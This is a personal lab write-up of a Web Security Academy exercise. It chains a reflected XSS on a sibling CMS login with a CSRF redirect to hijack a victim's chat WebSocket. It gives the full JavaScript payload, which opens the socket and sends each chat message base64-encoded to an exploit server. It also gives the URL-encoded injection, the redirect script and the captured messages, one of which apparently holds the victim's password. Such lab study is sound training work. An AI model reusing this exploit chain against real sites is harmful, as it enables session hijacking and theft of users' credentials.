
[...back](../note-1.md)

# 1 brief

```
mission: retreive login cred from target chat history, and login
live chat uses websocket.
```

---

# 2 investigation

websocket handshake (endpoint)
```http
GET /chat HTTP/2
Host: 0a4f00d4032df8ff831532a7006400c0.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0a4f00d4032df8ff831532a7006400c0.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=jjVzWOUgELXtJ5uzBg3DcKcs1bf0X5YS
Sec-Websocket-Key: mdE4Wl7zK15PB8RVkT4aug==

---

HTTP/1.1 101 Switching Protocol
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 4Mdk54uqqJVmqVGEUrdJBZavvqQ=
Content-Length: 0
```

chat init
`READY` <<< send this message
this will retrieve chat history as to continue chat from the user history
[see more in chat.js](./assets/websocket-chat.js.md)

`SameSite=Strict`
prevents us from directly exploit the endpoint... we need samesite injectable redirect! 
[see also samesite-bypass](./samesite-bypass.md)

`GET /product?productId=1` <<< no

*sibling domain*
`https://cms-0a74007c04954788bc3312d200a80090.web-security-academy.net` <<< username:password field is xss-able-username, work with GET no need `_method=POST`

> plan csrf will effectively to sibling endpoint `GET https://cms-0a74007c04954788bc3312d200a80090.web-security-academy.net/login?username=payload&password=b`
> > payload = xss wil get chat history and parse it back, by following subtasks:
> > > connect websocket to chat
> > > get chat history
> > > parse it back to our exploit server

---

# 3 test xss payload

payload (from [chat.js](./assets/websocket-chat.js.md))
```js
<script>
	var w=new WebSocket("wss://0a74007c04954788bc3312d200a80090.web-security-academy.net/chat");

	w.onopen = function (evt) {
		w.send("READY");
		res(w);
	};

	w.onmessage = function (evt) {
		var m = evt.data;
		fetch("https://exploit-0a4700a304384741bc6f111f01fd0016.exploit-server.net/exploit?m=" + btoa(m));
	};

</script>
```

verify from exploit server log
```
10.0.4.71       2025-11-08 06:17:17 +0000 "GET /exploit?m=eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

debase64(m)
```
m = eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9

{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```

---

# 4 test payload on sibling endpoint

payload -> urlencoded
```url
%3c%73%63%72%69%70%74%3e%0a%09%76%61%72%20%77%3d%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%37%34%30%30%37%63%30%34%39%35%34%37%38%38%62%63%33%33%31%32%64%32%30%30%61%38%30%30%39%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%09%77%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%09%77%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%09%09%72%65%73%28%77%29%3b%0a%09%7d%3b%0a%0a%09%77%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%09%76%61%72%20%6d%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%09%09%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%34%37%30%30%61%33%30%34%33%38%34%37%34%31%62%63%36%66%31%31%31%66%30%31%66%64%30%30%31%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%3d%22%20%2b%20%62%74%6f%61%28%6d%29%29%3b%0a%09%7d%3b%0a%0a%3c%2f%73%63%72%69%70%74%3e
```

endpoint
```http
GET https://cms-0a74007c04954788bc3312d200a80090.web-security-academy.net/login?username=$payload&password=b
```

verify xss reflected on username (with 'Invalid')

---

# 5 craft csrf

```js
<script>
document.location = "https://cms-0a74007c04954788bc3312d200a80090.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%09%76%61%72%20%77%3d%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%22%77%73%73%3a%2f%2f%30%61%37%34%30%30%37%63%30%34%39%35%34%37%38%38%62%63%33%33%31%32%64%32%30%30%61%38%30%30%39%30%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%22%29%3b%0a%0a%09%77%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%09%77%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%09%09%72%65%73%28%77%29%3b%0a%09%7d%3b%0a%0a%09%77%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%20%28%65%76%74%29%20%7b%0a%09%09%76%61%72%20%6d%20%3d%20%65%76%74%2e%64%61%74%61%3b%0a%09%09%66%65%74%63%68%28%22%68%74%74%70%73%3a%2f%2f%65%78%70%6c%6f%69%74%2d%30%61%34%37%30%30%61%33%30%34%33%38%34%37%34%31%62%63%36%66%31%31%31%66%30%31%66%64%30%30%31%36%2e%65%78%70%6c%6f%69%74%2d%73%65%72%76%65%72%2e%6e%65%74%2f%65%78%70%6c%6f%69%74%3f%6d%3d%22%20%2b%20%62%74%6f%61%28%6d%29%29%3b%0a%09%7d%3b%0a%0a%3c%2f%73%63%72%69%70%74%3e&password=b"
</script>
```

m
```base64
eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IlRoYW5rcywgSSBob3BlIHRoaXMgZG9lc24mYXBvczt0IGNvbWUgYmFjayB0byBiaXRlIG1lISJ9

eyJ1c2VyIjoiWW91IiwiY29udGVudCI6IkkgZm9yZ290IG15IHBhc3N3b3JkIn0=

eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6IkhlbGxvLCBob3cgY2FuIEkgaGVscD8ifQ== 

eyJ1c2VyIjoiQ09OTkVDVEVEIiwiY29udGVudCI6Ii0tIE5vdyBjaGF0dGluZyB3aXRoIEhhbCBQbGluZSAtLSJ9 

eyJ1c2VyIjoiSGFsIFBsaW5lIiwiY29udGVudCI6Ik5vIHByb2JsZW0gY2FybG9zLCBpdCZhcG9zO3MgNmo0bTZ4cDgxajNzazJlYnlvZGoifQ== 
```

---

[...back](../note-1.md)
